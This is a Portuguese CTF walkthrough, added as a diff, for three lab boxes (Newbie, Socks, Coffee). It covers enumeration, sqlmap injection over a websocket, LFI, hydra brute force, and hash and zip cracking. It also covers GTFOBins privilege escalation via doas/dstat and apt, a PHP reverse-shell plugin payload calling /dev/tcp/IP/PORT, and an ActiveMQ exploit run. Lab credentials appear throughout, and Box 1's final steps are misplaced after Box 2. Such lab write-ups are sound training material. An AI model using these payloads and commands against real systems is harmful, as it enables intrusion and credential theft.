@@ -1,0 +1,145 @@
+Box 1 - Newbie
+1º Flag
+Com um scan inicial com o nmap identificamos os seguintes serviços:
+No serviço web encontramos uma página default do apache.
+Explorando o serviço por outras páginas e endpoints não encontraremos nada, mas se analisarmos os headers retornado pela aplicação encontramos o seguinte:
+Podemos configurar o arquivo hosts da nossa máquina para conseguirmos acessar o domínio.
+Domínio: yourhouse.io
+Se olharmos o código fonte da página, encontraremos uma string encodada em base64:
+Base64: U29seWR7by95b3VyX2ZpcnN0X2ZsYWc6KX0=
+Usando a nossa própria máquina podemos fazer o decoding:
+Comando: echo "U29seWR7by95b3VyX2ZpcnN0X2ZsYWc6KX0=" | base64 -d
+2º Flag
+Fazendo uma enumeração com o ffuf ou outra ferramenta similar, encontraremos uma página php.
+É um Tiny File Manager e com ele é possível fazer o upload de uma reverse shell. Mas primeiro precisamos logar. Se tentarmos um bruteforce com a wordlist rockyou não haverá sucesso (até pode usar uma das wordlists do SecList que possuem o password, mas há um jeito mais fácil).
+Podemos pesquisar qual seria o password default do Tiny File Manager e tentarmos logar.
+No Github desta aplicação há os default username e password. Logo, conseguiremos o acesso ao Tiny Manager.
+Link Repositório: https://github.com/prasathmani/tinyfilemanager
+Uma vez logado podemos fazer o upload de uma reverse shell. Neste caso será usado a reverse shell do pentestmonkey 
+Iniciando o listener na máquina atacante e entrando na página do arquivo uploadado, ganhamos acesso ao sistema:
+Indo para o diretório raiz do sistema, encontraremos a 2º flag.
+3º Flag
+Podemos realizar uma exploração inicial do sistema e encontraremos no folder home do sistema um folder chamado share que contém um arquivo de texto chamado pass:
+String criptografada: 22ee0049dc8f240f419d0f693eccef50a46f600f
+Podemos usar uma ferramenta para fazer o cracking, usando o crackstation neste caso descobrimos que o possível password é:
+Password: winter5
+Visto que o único user deste sistema é o joao e como há um serviço ssh sendo executado no sistema, podemos logar como o usuário joao usando a credencial encontrada e adquirir a 3º flag:
+4º Flag
+Agora podemos usar um script para nos auxiliar no escalonamento para pegarmos root. Neste caso será usado o linpeas. 
+Com o linpeas descobrimos que há o doas (similar ao sudo) instalado, sabendo disto podemos ver quais as regras do doas no arquivo de configuração que está localizado no diretório etc.
+Podemos usar o doas para executar o dstat como root e olhando no GTFOBins descobrimos que há como fazer escalonamento para outro user:
+
+Box 2 - Socks
+2 / 12
+ 
+1º Flag
+
+Iniciando com o scan encontramos os seguintes serviços:
+No Nginx encontramos apenas uma página de “Em Breve” e se fizermos um dirbust encontraremos um tiny file manager (que usaremos na próxima etapa).
+Devemos ir para a aplicação Nodejs (porta 3000) sendo executada e nela teremos uma página de Forbidden:
+Para conseguirmos acessá-la devemos usar o domínio que foi dado no texto do desafio (lib.books), logo configurando o arquivo hosts podemos acessar a página.
+Com este acesso agora podemos fazer uma enumeração na aplicação web e teremos o seguinte resultado:
+ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt -u http://lib.books:3000/FUZZ -H "Host: lib.books:3000"
+Como podemos observar na imagem, stock é o único endpoint que podemos acessar (se acessarmos os outros diretórios ocorrerá um erro de Cannot Get).
+Encontramos essa aplicação que é um websocket. Nele podemos entrar com um número e será retornado se o livro com o ID correspondente está disponível em estoque.
+Esta aplicação é vulneravel a SQLi, como pode ser visto abaixo:
+Primeiramente temos de descobrir o que é passado para a aplicação NodeJS quando entramos com o input, podemos olhar na aba de network do navegador:
+Outro detalhe importantíssimo é olharmos o endpoint que está sendo mandado nosso input, para isso basta olhar o Header:
+Com a descoberta da falha e do parâmetro passado podemos explorá-la com o SQLMap usando os seguintes parâmetros:
+sqlmap -u 'ws://lib.books:3000/ws' --data '{"bookID":"*"}' --technique=B --risk 3 --level 5 --dbs
+Fazendo o dump do DB flag, pegaremos a 1º flag.
+sqlmap -u 'ws://lib.books:3000/ws' --data '{"bookID":"*"}' --technique=B --risk 3 --level 5 -D flag --dump
+2º Flag
+Agora fazendo o dump do db users:
+sqlmap -u 'ws://lib.books:3000/ws' --data '{"bookID":"*"}' --technique=B --risk 3 --level 5 -D users --dump
+Voltando na porta 80 no tiny file manager, conseguimos logar com a credencial do filemanage5:
+Username: filemanage5
+Password: QwoC90zXdpW217Dxk4cZF2
+Depois de baixar o zip, teremos de fazer um cracking para pegar o password deste zip:
+zip2john bk_1337.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Password: sandwich
+O arquivo bloglib é um arquivo de domínio do nginx, logo podemos acessar o bloglib.book após configurarmos o arquivo hosts.
+O site é 100% estático, não há muito o que explorar mas se olharmos o código fonte, encontraremos a 2º flag.
+3º Flag
+Agora temos de explorar este domínio, se fizermos uma enumeração não encontraremos nada, mas fazendo uma enumeração de subdomínios encontramos algo interessante:
+Na fonte do site temos a flag:
+4º Flag
+Lembrando que na etapa de SQLi tivemos outras duas credenciais:
+A credencial do bob irá funcionar para logarmos nesta etapa.
+No menu a única opção disponível é o “Servicos” que terá como entrar com um código:
+O que essa aplicação faz é bem simples, ela traz para o html da página o texto de um arquivo, portanto podemos supor que há uma vulnerabilidade de LFI.
+../../../../etc/passwd
+Agora podemos tentar fazer um bruteforce com hydra contra o serviço de ssh. Neste caso usaremos o user dev_alexPNode
+hydra -l dev_alexPNode -P /usr/share/wordlists/rockyou.txt -f ssh://172.18.18.2 -t 20
+Password: linkinpark
+Uma vez dentro do sistema encontraremos a 4º flag no diretório raiz do sistema.
+5º Flag
+Explorando o sistema encontramo que o user atual tem para executar apt como root e se procurarmos no GTFOBins, encontramos um exploit para pegarmos root
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+Temos de criar primeiramente um plugin malicioso em python para nos retornar a shell, o próprio GTFOBins nos dá o código do plugin, e também temos de encontrar em qual diretório estão os plugins do dstat. Nos resultados do linpeas podemos ver que há um folder chamado dstat onde o user joao tem as permissões necessárias para editar os arquivos.
+Temos permissão de escrita no folder dstat (path: /usr/share/dstat), executando os seguintes comandos teremos root e adquirimos a última flag:
+echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/share/dstat/dstat_xxx.py
+doas /usr/bin/dstat --xxx
+
+
+Box 3 - Coffee
+3 / 12
+1º Flag
+Iniciando com o nmap, encontramos os seguintes serviços:
+No apache não será encontrado nada, apenas uma página padrão do apache.
+Agora se olharmos o serviço ftp, teremos acesso aos seguintes arquivos:
+No arquivo de texto teremos um comunicado para o Tony que será usado para os próximos passos:
+O pdf retirado está protegido por um password, portanto teremos de usar o john para fazer o cracking.
+Password: coffee420
+Com isso, vemos que o documento é uma documentação do sistema e junto disto está a primeira flag!
+2º Flag
+Na documentação teremos uma informação muito importante para continuarmos.
+Há um domínio ativo que podemos explorar e editando o arquivo hosts, teremos a seguinte página:
+Se fizermos um dir bust não iremos encontrar nenhum diretório ou arquivo php ou html. Portanto, teremos de fazer uma busca por subdomínios. Será usado uma das wordlist da SecList junto ao ffuf.
+ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt -u http://coffeetime.coffee -H "Host: FUZZ.coffeetime.coffee" -e .php -fl 369
+Descobrimos que há um subdomínio chamado newsite, editando o arquivo hosts novamente teremos acesso a uma página semelhante à anterior de “Em breve!” mas com certas funcionalidades.
+Olhando o código fonte do site, encontraremos a flag.
+3º Flag
+Fazendo um dir bust para encontrarmos os seguintes arquivos e diretórios.
+Descobrimos que o subdomínio possui uma aplicação wordpress, com isso devemos lembrar do arquivo texto que achamos no início deste desafio.
+Logo podemos tentar fazer o bruteforce com o hydra para descobrir se ainda o Tony utiliza passwords fracos.
+Podemos verificar que a página de login permite enumeração de usernames:
+Confirmada a existência do user tony, iremos pegar os parâmetros da request feita durante o login.
+log=tony&pwd=asdasd&wp-submit=Log+In&redirect_to=http%3A%2F%2Fnewsite.coffeetime.coffee%2Fwp-admin%2F&testcookie=1
+Também temos de pegar a mensagem de erro que aparece, neste caso seria: “The password you entered for the username”
+Agora usando o hydra:
+hydra -l tony -P /usr/share/wordlists/rockyou.txt newsite.coffeetime.coffee http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fnewsite.coffeetime.coffee%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -F
+Password: basketball
+Podemos logar como tony e de cara percebemos que este user tem privilégios de admin na aplicação wordpress. Logo, podemos fazer o uso de uma shell reverse em php fazendo o upload de um plugin para o wordpress.
+Primeiro fazendo o payload:
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
+?>
+Agora faremos o zip com o comando zip rev-plugin rev.php, agora basta fazer o upload e ativar o plugin que imediatamente pegaremos a shell!
+Pelo prompt já vemos que estamos como o user www-data e agora pegaremos TTY (neste caso só precisa do xterm) com o comando  export TERM=xterm.
+Uma vez dentro do sistema, podemos olhar o diretório raiz para encontrar a terceira flag!
+4º Flag
+No diretório home do admin teremos os arquivos do wordpress e o arquivo de configuração terá o password para o user root do mariadb. Lembrando que o resultado do nmap nos trouxe um serviço de banco de dados, com isso podemos logar no serviço com as credenciais encontradas.
+User: testdb
+Password: RIT7O21932ds785aSjcS3CtAznc359915
+No database users teremos o password do user admin do sistema.
+Na etapa anterior poderíamos ter olhado tanto pelo linpeas quanto pelo comando ss -tulnp que há aplicações apenas acessíveis ao localhost.
+A aplicação que mais nos interessa é a da porta 8161 que é um activeMQ vulnerável com senhas default. Logo, faremos um túnel ssh para termos acesso a ela.
+ssh -L 8161:localhost:8161 admin@IP
+Podemos fazer um nmap após o túnel ssh para nos certificamos que é uma aplicação activeMQ.
+Quando acessar o serviço, teremos de entrar com o username e password default.
+Username: admin
+Password: admin
+Clicando na opção de “Manage ActiveMQ broker” descobriremos a versão do activeMQ.
+Além da versão temos também o ano da aplicação.
+Isso nos ajudará muito a encontrar a vulnerabilidade.
+Encontramos uma CVE que corresponde a vulnerabilidade que procuramos. No site oficial do apache (activeMQ) teremos uma ideia de que a vulnerabilidade é um RCE que pegamos quando fazemos o upload de uma webshell. 
+Podemos agora procurar pela poc desta CVE e observando os resultados encontramos um repositório no github.
+Podemos clicar em “vulhub” para vermos o repositório do usuário e encontraremos a poc.
+Podemos agora baixar a poc e utilizá-la. Precisamos do python3 para executá-la e do username e password. 
+python3 poc.py -u admin -p admin http://localhost:8161
+Usando o link dado pelo exploit, teremos o seguinte output:
+Temos que usar o control+f para nos ajudar achar o output do comando id, para isso basta entrar com root que iremos achar:
+Como somos root, podemos dar um comando de ls no diretório root e encontrar a flag:
+Agora dando cat /root/flag e control+f buscando por Solyd (já que as flags começam assim).
